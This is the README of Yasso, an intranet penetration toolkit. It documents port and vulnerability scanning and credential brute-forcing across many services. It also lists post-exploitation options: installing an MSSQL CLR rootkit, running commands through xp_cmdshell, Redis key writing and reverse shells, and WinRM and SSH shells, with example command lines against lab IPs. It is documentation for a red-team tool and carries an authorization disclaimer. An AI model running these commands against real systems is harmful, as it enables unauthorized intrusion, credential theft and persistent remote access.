👾 Yasso-Yasso 👾

![go](https://img.shields.io/badge/Go-1.16.4-blue)

[Chinese Introduce](README.zh_CN.md)

## Introduce😈

Yasso will be released as an Intranet assisted penetration tool set, which brings together a number of utility features
to help Red Team members use tools in extreme Intranet environments, as well as Intranet self-check for Blue Team
members. It also adds proxy functionality and scan concurrency for ants. In the realization of functions at the same
time the pursuit of accuracy and speed.

[![asciicast](https://asciinema.org/a/fBxRVxLJ30eVo0dOz2e9mlAZL.svg)](https://asciinema.org/a/fBxRVxLJ30eVo0dOz2e9mlAZL)

The format is

```
Yasso [模块] [参数1] [参数2] [参数...]
```

In the module, 'Flag' represents the parameters of the current command, and 'Global Flags' represents the Global
parameters (all commands can be used).

## Program function module 👻

-H parameters all support IP. TXT import, as shown below

![image](https://user-images.githubusercontent.com/74412075/148518267-4f72e048-6aee-4ba6-b67d-a447468f2807.png)

Currently available functional modules:

<b>ALL module: full scan mode of calling all modules, faster and more powerful, perfect combination of ants and
concurrency</b>

```
Usage:
  Yasso all [flags]

Flags:
  -h, --help            help for all
  -H, --host hosts      Set hosts(The format is similar to Nmap)
      --noping          No use ping to scanner alive host (default true)
  -P, --ports ports     Set ports(The format is similar to Nmap)
      --proxy string    Set socks5 proxy
      --runtime int     Set scanner ants pool thread (default 100)
      --time duration   Set timeout  (default 1s)
```

<b>Ping module: ordinary user can call system ping, root can choose to use ICMP packet</b>

```
Use ping or icmp to scanner alive host

Usage:

Yasso ping [flags]

Flags:
-h, --help help for ping
-H, --host hosts Set hosts(The format is similar to Nmap)
-i, --icmp Icmp packets are sent to check whether the host is alive(need root)
```

<b>Crack module: Powerful blasting module and utilizing toolset - sub-toolset</b>

```
Available Commands:
  ftp         ftp burst module (support proxy)
  grdp        RDP burst module (support proxy)
  log4j       Open a socket listener to test log4J vulnerabilities offline
  mongo       MongoDB burst module (support proxy)
  mssql       SQL Server burst module and extend tools (not support proxy)
  mysql       MYSQL burst module and extend tools (support proxy)
  postgres    PostgreSQL burst module (not support proxy)
  redis       Redis burst and Redis extend tools (support proxy)
  smb         Smb burst module (not support proxy)
  ssh         SSH burst and SSH extend tools (support proxy)
  winrm       winrm burst and extend tools (support proxy)

Flags:
      --crack              make sure to use crack
  -h, --help               help for crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

The program is mainly divided into a number of sub-command functions, each function is annotated in detail, here is a
detailed introduction of sub-functions

<details>
<summary>ftp FTP service blowing module - support SOcks5 proxy</summary>

```
Flags:
  -h, --help   help for ftp

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>grdp RDP service blowup module - support socks5 proxy</summary>

```
Flags:
      --domain string   set host domain
  -h, --help            help for grdp

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>log4j log4j2 server - For manual log4J vulnerability detection within the network</summary>

```
Flags:
  -b, --bind string   socket listen address (default "0.0.0.0:4568")
  -h, --help          help for log4j

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>mongo mongodb service blasting module - support socks5 proxy</summary>

```
Flags:
  -h, --help   help for mongo

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>mssql SQL Server service blowup module and power lifting auxiliary module - socks5 proxy is not supported</summary>

```
Flags:
      --cld string           Execute WarSQLKit  Command (eg.) --cld "whoami"
  -c, --cmd string           Execute System command
  -h, --help                 help for mssql
      --hostname string      Remote Connect mssql address(brute param need false)
      --inkit int            install mssql SQLKit Rootkit [1,WarSQLKit] [2,SharpSQLKit(no echo)]
      --kithelp int          print SQLKit Use help
      --method int           Execute System command method [1,xpshell] [2,oleshell] (default 1)
      --pass string          Login ssh password
  -s, --sql string           Execute sql command
      --unkit int            uninstall mssql SQLKit Rootkit [1,WarSQLKit] [2,SharpSQLKit(no echo)]
      --upload stringArray   Use ole upload file (.eg) source,dest
      --user string          Login ssh username (default "sa")

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>mysql mysql service explosion module and database query - support for SOcks5 proxy</summary>

```
Flags:
  -C, --cmd string        mysql sql command
  -h, --help              help for mysql
      --hostname string   Remote Connect a Mysql (brute param need false)
      --pass string       Login ssh password
      --shell             create sql shell to exec sql command
      --user string       Login ssh username

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>postgres PostgreSQL Service blowup module - No support for SOcks5 proxy</summary>

```
Flags:
  -h, --help   help for postgres

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>


<details>
<summary>Redis Redis service blowup module, unauthorized detection, one-click utilization (write public key, bounce shell) - support socks5 proxy</summary>

```
Flags:
  -h, --help              help for redis
      --hostname string   Redis will connect this address
      --pass string       set login pass
      --rebound string    Rebound shell address (eg.) 192.168.1.1:4444
      --rekey string      Write public key to Redis (eg.) id_rsa.pub

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>

<details>
<summary>smb SMB Service blowup module - Does not support SOcks5 proxy</summary>

```
Flags:
  -h, --help   help for smb

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>


<details>
<summary>ssh SSH service burst module, fully interactive shell connection - support socks5 proxy
</summary>

```
Flags:
  -h, --help              help for ssh
      --hostname string   Open an interactive SSH at that address(brute param need false)
      --key string        ssh public key path
      --pass string       Login ssh password
      --user string       Login ssh username

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>


<details>
<summary>winrm Winrm service blowup module, command execution horizontal - support socks5 proxy
</summary>

```
Flags:
  -c, --cmd string        Execute system command
  -h, --help              help for winrm
      --hostname string   Open an interactive SSH at that address(brute param need false)
      --pass string       Login ssh password
      --shell             Get a cmd shell with WinRM
      --user string       Login ssh username

Global Flags:
      --crack              make sure to use crack
  -H, --hosts string       to crack hosts address (crack Must)
      --pd string          pass dic path (.eg) pass.txt
      --port int           to crack hosts port (if not set use default)
      --proxy string       set socks5 proxy address
      --runtime int        set crack thread number (default 100)
      --timeout duration   crack module timeout(.eg) 1s (ns,ms,s,m,h) (default 1s)
      --ud string          user dic path (.eg) user.txt
```

</details>


<b>ps module: using ANTS coroutine for port scanning, faster and more accurate - does not support SOcks5 proxy

</b>

```
Usage:
  Yasso ps [flags]

Flags:
  -h, --help            help for ps
  -H, --hosts hosts     Set hosts(The format is similar to Nmap)
  -p, --ports ports     Set ports(The format is similar to Nmap)(eg.) 1-2000,3389
  -r, --runtime int     Set scanner ants pool thread (default 100)
  -t, --time duration   Set timeout (eg.) -t 50ms(ns,ms,s,m,h) (default 500ms)
```

<b>vulscan module: Host vulnerability scan - support MS17010, SMbGhost - support socks5 proxy</b>

```
Usage:
  Yasso vulscan [flags]

Flags:
      --all            scan all vuln contains ms17010,smbghost
      --gs             scan smbghost
  -h, --help           help for vulscan
  -H, --hosts hosts    Set hosts(The format is similar to Nmap)
      --ms             scan ms17010
      --proxy string   Set socks5 proxy
```

<b>WebScan module: full dismap porting, with more powerful fingerprint recognition - support socks5 proxy</b>

```
Usage:
  Yasso webscan [flags]

Flags:
  -h, --help            help for webscan
  -H, --hosts hosts     Set hosts(The format is similar to Nmap)
      --ping            Use ping to scan alive host
  -p, --ports ports     Set ports(The format is similar to Nmap)(eg.) 1-2000,3389
      --proxy string    Set socks5 proxy and use it
  -r, --runtime int     Set scanner ants pool thread (default 508)
  -t, --time duration   Set timeout (eg.) -t 50ms(ns,ms,s,m,h) (default 1s)
```

<b>winscan module: Windows host netBIOS recognition, OXID network card discovery, SMB host fingerprint - support SOcks5
proxy</b>

```
netbios、smb、oxid scan

Usage:
  Yasso winscan [flags]

Flags:
      --all             Set all flag and use oxid,netbios,smb scan (default true)
  -h, --help            help for winscan
  -H, --hosts hosts     Set hosts(The format is similar to Nmap)
      --netbios         Set netbios flag and use netbios scan
      --oxid            Set oxid flag and use oxid scan
      --proxy string    Set socks5 proxy and use it
      --smb             Set smb flag and use smb scan
      --time duration   Set net conn timeout (default 1s)
```

## Example👿

Scan service invocation for the ALL module

```
Yasso. Exe all - 192.168.248.1/24 H
```

![image](https://user-images.githubusercontent.com/74412075/148240369-14cc4c77-e4f8-4fd1-8faa-e716852d3ed8.png)

MSSQL commands perform powerlifting and WarSQLKit -CLR Rookit install and uninstall the powerlifting function

```
Yasso.exe crack MSSQL --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128
Yasso.exe crack MSSQL --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 --method 2
Yasso.exe crack MSSQL --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 --inkit 1
Yasso.exe crack MSSQL --hostname 192.168.248.128 --user sa --pass "admin@123" -- CLD "sp_getSqlHash"
Yasso.exe crack MSSQL --hostname 192.168.248.128 --user sa --pass "admin@123" -- CLD "whoami"
Yasso.exe crack MSSQL --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 --unkit 1
```

![image](https://user-images.githubusercontent.com/74412075/148234003-8e2ceb59-95c5-4fc3-ad65-501294ddce6b.png)

Winrm command execution and interactive shell

```
Yasso.exe crack winrm --hostname 192.168.248.128 -c "ipconfig /all" --pass "930517" --user "administrator"
```

![image](https://user-images.githubusercontent.com/74412075/148234337-80fabcef-a333-402d-8e97-e694b89119c0.png)

```
Yasso. Exe crack winrm --hostname 192.168.248.128 --shell --pass "930517" --user "administrator"
```

![image](https://user-images.githubusercontent.com/74412075/148234486-037aaf56-fe11-40a0-9781-82b537ef9a37.png)

grdp's powerful blasting function

```
Yasso. Exe crack GRDP --domain "kilon.local" -- pd.\ pass. TXT -- ud.\ user. TXT -h 192.168.248.129/24 --crack
```

![image](https://user-images.githubusercontent.com/74412075/148234733-fbdc34e7-c73e-49f7-8942-3a1863915213.png)
ssh interactive login

```
Yasso.exe crack SSH --hostname 192.168.248.219 --user root --pass kali
```

![image](https://user-images.githubusercontent.com/74412075/148235003-a72116d3-df9b-4b4e-9523-21d5f8b30e1b.png)

## Tool advantages 🤡

- Simple command, simple module function invocation, easy to expand and add a variety of new functions

- A large collection of commonly used features, making Yasso not like a regular scanner, but rather a toolset

- Powerful SQL penetration assist functions, providing common Redis, mysql, MSSQL databases such as one key weight and
  database operations

- Powerful concurrent blasting, allowing larger dictionaries to gain faster speed

- The strong addition of RDP and WinRM makes the horizontal network faster and more convenient

## Disclaimer 🧐

This tool is only applicable to enterprise security construction activities legally authorized by. If you need to test
the usability of this tool, please build a target machine environment by yourself.

When using this tool for testing, ensure that you comply with local laws and regulations and that you have obtained
sufficient authorization. <b>It is important not to scan unauthorized targets</b>
If you have any illegal behavior during the use of the tool, you shall bear the corresponding consequences by yourself,
and we will not assume any legal and joint liability. Before installing and using this tool, please <b>carefully read
and fully understand the contents of each clause </b>. Restrictions, disclaimers or other clauses related to your
significant rights and interests may be highlighted in bold or underlined forms. Do not install and use this tool unless
you have fully read, fully understand and accept all terms of this agreement. Your use of this Agreement or your
acceptance of this Agreement in any other way, express or implied, shall be deemed that you have read and agreed to be
bound by this Agreement.

## Tool writing reference link 👀

```
https://github.com/shadow1ng/fscan
https://github.com/k8gege/LadonGo
https://github.com/zyylhn/zscan
https://github.com/uknowsec/SharpSQLTools
https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit
https://github.com/masterzen/winrm
https://github.com/tomatome/grdp
https://github.com/panjf2000/ants
```